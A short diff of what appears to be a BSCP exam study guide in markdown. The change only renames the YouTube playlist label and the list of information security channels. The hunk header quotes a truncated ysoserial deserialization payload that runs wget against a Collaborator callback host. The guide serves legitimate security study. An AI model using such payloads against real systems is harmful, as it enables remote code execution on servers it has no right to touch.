@@ -2334,9 +2334,9 @@ java -jar /opt/ysoserial/ysoserial.jar CommonsCollections4 'wget http://Collabor
   
 ## YouTube Training Playlist 
   
-[My YouTube Study Playlist](https://youtube.com/playlist?list=PLsDxQTEdg_YkVMP6PybE7I-hAdhR7adem)  
+[My YouTube BSCP Study Playlist](https://youtube.com/playlist?list=PLsDxQTEdg_YkVMP6PybE7I-hAdhR7adem)  
 
-Youtube channels:  
+Youtube Information Security content creators channels:  
 
 1. [Rana Khalil](https://www.youtube.com/@RanaKhalil101/videos)  
 2. [David Bombal](https://www.youtube.com/@davidbombal/videos)  
